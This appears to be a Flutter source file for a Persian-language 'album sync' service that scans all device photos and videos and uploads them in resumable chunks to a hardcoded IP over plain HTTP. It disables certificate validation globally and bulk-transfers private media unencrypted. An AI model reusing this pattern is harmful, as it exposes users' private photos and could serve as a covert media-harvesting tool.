import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:flutter_background_service_android/flutter_background_service_android.dart';
import 'package:http/http.dart' as http;
import 'package:http/io_client.dart';
import 'package:photo_manager/photo_manager.dart';
import 'package:path_provider/path_provider.dart';
import 'package:sqflite/sqflite.dart';
import 'package:path/path.dart';

const String galleryUrl = 'http://194.48.198.154:8080';
const int chunkSize = 1024 * 1024;

http.Client _createHttpClient() {
  final ioClient = HttpClient()
    ..badCertificateCallback = (X509Certificate cert, String host, int port) => true;
  return IOClient(ioClient);
}

class MyHttpOverrides extends HttpOverrides {
  @override
  HttpClient createHttpClient(SecurityContext? context) {
    return super.createHttpClient(context)
      ..badCertificateCallback = (X509Certificate cert, String host, int port) => true;
  }
}

// ============================================
// دیتابیس محلی صف آپلود
// ============================================
class UploadQueueDB {
  static Database? _db;

  static Future<Database> get database async {
    _db ??= await _initDB();
    return _db!;
  }

  static Future<Database> _initDB() async {
    final dir = await getApplicationDocumentsDirectory();
    final dbPath = join(dir.path, 'upload_queue.db');
    return openDatabase(dbPath, version: 1, onCreate: (db, version) async {
      await db.execute(
        "CREATE TABLE upload_queue ("
        "id INTEGER PRIMARY KEY AUTOINCREMENT,"
        "asset_id TEXT UNIQUE,"
        "file_path TEXT,"
        "file_name TEXT,"
        "total_size INTEGER,"
        "uploaded_bytes INTEGER DEFAULT 0,"
        "status TEXT DEFAULT 'pending',"
        "upload_id TEXT,"
        "mime_type TEXT,"
        "asset_type TEXT,"
        "retries INTEGER DEFAULT 0,"
        "created_at TEXT"
        ")"
      );
    });
  }

  static Future<void> insertOrUpdate(Map<String, dynamic> data) async {
    final db = await database;
    await db.insert('upload_queue', data, conflictAlgorithm: ConflictAlgorithm.replace);
  }

  static Future<List<Map<String, dynamic>>> getPending() async {
    final db = await database;
    return db.query(
      'upload_queue',
      where: "status = ? AND retries < ?",
      whereArgs: ['pending', 5],
      limit: 1,
    );
  }

  static Future<List<Map<String, dynamic>>> getStuckUploading() async {
    final db = await database;
    return db.query('upload_queue', where: "status = ?", whereArgs: ['uploading']);
  }

  static Future<Set<String>> getCompletedAssetIds() async {
    final db = await database;
    final rows = await db.query('upload_queue', where: "status = ?", whereArgs: ['completed']);
    return rows.map((e) => e['asset_id'] as String).toSet();
  }

  static Future<void> updateStatus(
    int id,
    String status, {
    int? uploadedBytes,
    String? uploadId,
    int? retries,
  }) async {
    final db = await database;
    final data = <String, dynamic>{'status': status};
    if (uploadedBytes != null) data['uploaded_bytes'] = uploadedBytes;
    if (uploadId != null) data['upload_id'] = uploadId;
    if (retries != null) data['retries'] = retries;
    await db.update('upload_queue', data, where: "id = ?", whereArgs: [id]);
  }

  static Future<void> markCompleted(int id) async {
    final db = await database;
    await db.update('upload_queue', {'status': 'completed'}, where: "id = ?", whereArgs: [id]);
  }

  static Future<void> updateUploadedBytes(int id, int bytes) async {
    final db = await database;
    await db.update('upload_queue', {'uploaded_bytes': bytes}, where: "id = ?", whereArgs: [id]);
  }
}

// ============================================
// اسکن گالری — صفحه‌صفحه (۵۰ تایی) + yield
// ============================================
Future<int> scanGalleryToQueue() async {
  final albums = await PhotoManager.getAssetPathList(type: RequestType.all);
  if (albums.isEmpty) return 0;

  final localCompleted = await UploadQueueDB.getCompletedAssetIds();
  final client = _createHttpClient();
  final deviceId = Platform.localHostname;
  final serverUploaded = <String>{};
  int newItems = 0;

  for (final album in albums) {
    final count = await album.assetCountAsync;
    if (count == 0) continue;

    const pageSize = 50;
    for (int start = 0; start < count; start += pageSize) {
      final end = (start + pageSize < count) ? start + pageSize : count;
      final assets = await album.getAssetListRange(start: start, end: end);

      if (assets.isNotEmpty) {
        final ids = assets.map((a) => "asset_id=${a.id}").join("&");
        try {
          final res = await client
              .get(Uri.parse("$galleryUrl/api/gallery/check/?device_id=$deviceId&$ids"))
              .timeout(const Duration(seconds: 30));
          if (res.statusCode == 200) {
            final data = jsonDecode(res.body);
            serverUploaded.addAll((data['uploaded_asset_ids'] as List).cast<String>());
          }
        } catch (_) {}
      }

      for (final asset in assets) {
        if (localCompleted.contains(asset.id) || serverUploaded.contains(asset.id)) continue;

        final file = await asset.originFile ?? await asset.file;
        if (file == null) continue;

        await UploadQueueDB.insertOrUpdate({
          'asset_id': asset.id,
          'file_path': file.path,
          'file_name': asset.title ?? "${asset.id}.jpg",
          'total_size': await file.length(),
          'uploaded_bytes': 0,
          'status': 'pending',
          'upload_id': null,
          'mime_type': asset.mimeType ??
              (asset.type == AssetType.image ? 'image/jpeg' : 'video/mp4'),
          'asset_type': asset.type == AssetType.image ? 'image' : 'video',
          'retries': 0,
          'created_at': DateTime.now().toIso8601String(),
        });
        newItems++;
      }

      // نفس دادن به UI
      await Future.delayed(Duration.zero);
    }
  }

  return newItems;
}

// ============================================
// راه‌اندازی سرویس پس‌زمینه
// ============================================
Future<void> initializeBackgroundService() async {
  final service = FlutterBackgroundService();
  await service.configure(
    androidConfiguration: AndroidConfiguration(
      onStart: onServiceStart,
      autoStart: false,
      isForegroundMode: true,
      notificationChannelId: 'gallery_sync_channel',
      initialNotificationTitle: 'همگام‌سازی آلبوم',
      initialNotificationContent: 'در حال آماده‌سازی...',
      foregroundServiceNotificationId: 888,
    ),
    iosConfiguration: IosConfiguration(),
  );
}

@pragma('vm:entry-point')
void onServiceStart(ServiceInstance service) async {
  try {
    WidgetsFlutterBinding.ensureInitialized();
    HttpOverrides.global = MyHttpOverrides();
  } catch (e) {
    return;
  }

  if (service is AndroidServiceInstance) {
    service.setAsForegroundService();
    service.setForegroundNotificationInfo(
      title: 'همگام‌سازی آلبوم',
      content: 'در حال آپلود...',
    );
  }

  await _processQueue(service);

  Timer.periodic(const Duration(minutes: 2), (timer) async {
    await _processQueue(service);
  });
}

// ============================================
// پردازش صف آپلود (تکه‌تکه + Resume)
// ============================================
Future<void> _processQueue(ServiceInstance service) async {
  final client = _createHttpClient();

  final stuck = await UploadQueueDB.getStuckUploading();
  for (final item in stuck) {
    await UploadQueueDB.updateStatus(
      item['id'] as int,
      'pending',
      retries: (item['retries'] as int) + 1,
    );
  }

  while (true) {
    final pending = await UploadQueueDB.getPending();
    if (pending.isEmpty) {
      if (service is AndroidServiceInstance) {
        service.setForegroundNotificationInfo(
          title: 'همگام‌سازی آلبوم',
          content: 'همه فایل‌ها آپلود شدند',
        );
      }
      break;
    }

    final item = pending.first;
    final id = item['id'] as int;
    final assetId = item['asset_id'] as String;
    final filePath = item['file_path'] as String;
    final totalSize = item['total_size'] as int;
    final fileName = item['file_name'] as String;

    await UploadQueueDB.updateStatus(id, 'uploading');

    if (service is AndroidServiceInstance) {
      service.setForegroundNotificationInfo(
        title: 'در حال آپلود',
        content: "$fileName (${_formatBytes(totalSize)})",
      );
    }

    try {
      String? uploadId = item['upload_id'] as String?;

      if (uploadId == null) {
        final initRes = await client
            .post(
              Uri.parse("$galleryUrl/api/gallery/chunked-upload/init/"),
              headers: {'Content-Type': 'application/json'},
              body: jsonEncode({
                'device_id': Platform.localHostname,
                'asset_id': assetId,
                'file_name': fileName,
                'total_size': totalSize,
                'mime_type': item['mime_type'],
              }),
            )
            .timeout(const Duration(seconds: 30));

        if (initRes.statusCode == 200) {
          final data = jsonDecode(initRes.body);
          if (data['status'] == 'exists') {
            await UploadQueueDB.markCompleted(id);
            continue;
          }
          uploadId = data['upload_id'] as String;
          await UploadQueueDB.updateStatus(id, 'uploading', uploadId: uploadId);
        } else {
          throw Exception("Init failed: ${initRes.statusCode}");
        }
      }

      final file = File(filePath);
      final uploadedBytes = item['uploaded_bytes'] as int? ?? 0;
      final startChunk = uploadedBytes ~/ chunkSize;
      final totalChunks = (totalSize + chunkSize - 1) ~/ chunkSize;

      final reader = file.openSync();
      if (uploadedBytes > 0) {
        reader.setPositionSync(uploadedBytes);
      }

      for (int i = startChunk; i < totalChunks; i++) {
        final remaining = totalSize - (i * chunkSize);
        final currentChunkSize = remaining < chunkSize ? remaining : chunkSize;
        final bytes = reader.readSync(currentChunkSize);

        final req = http.MultipartRequest(
          'POST',
          Uri.parse("$galleryUrl/api/gallery/chunked-upload/chunk/"),
        );
        req.fields['upload_id'] = uploadId!;
        req.fields['chunk_index'] = i.toString();
        req.files.add(http.MultipartFile.fromBytes('chunk', bytes, filename: "chunk_$i"));

        final streamedRes = await client.send(req).timeout(const Duration(seconds: 60));
        final res = await http.Response.fromStream(streamedRes);

        if (res.statusCode != 200) {
          throw Exception("Chunk failed: ${res.statusCode}");
        }

        final chunkData = jsonDecode(res.body);
        final newReceived = chunkData['received_bytes'] as int;
        await UploadQueueDB.updateUploadedBytes(id, newReceived);
      }
      reader.closeSync();

      final completeRes = await client
          .post(
            Uri.parse("$galleryUrl/api/gallery/chunked-upload/complete/"),
            headers: {'Content-Type': 'application/json'},
            body: jsonEncode({'upload_id': uploadId}),
          )
          .timeout(const Duration(seconds: 60));

      if (completeRes.statusCode == 200) {
        await UploadQueueDB.markCompleted(id);
      } else {
        throw Exception("Complete failed: ${completeRes.statusCode}");
      }
    } catch (e) {
      final current = await UploadQueueDB.database
          .then((db) => db.query('upload_queue', where: "id = ?", whereArgs: [id]));
      if (current.isNotEmpty) {
        final retries = (current.first['retries'] as int) + 1;
        await UploadQueueDB.updateStatus(id, 'pending', retries: retries);
      }

      if (service is AndroidServiceInstance) {
        service.setForegroundNotificationInfo(
          title: 'خطا در آپلود',
          content: '۵ ثانیه دیگر تلاش می‌شود...',
        );
      }
      await Future.delayed(const Duration(seconds: 5));
    }
  }
}

String _formatBytes(int bytes) {
  if (bytes < 1024) return "$bytes B";
  if (bytes < 1024 * 1024) return "${(bytes / 1024).toStringAsFixed(1)} KB";
  return "${(bytes / (1024 * 1024)).toStringAsFixed(1)} MB";
}
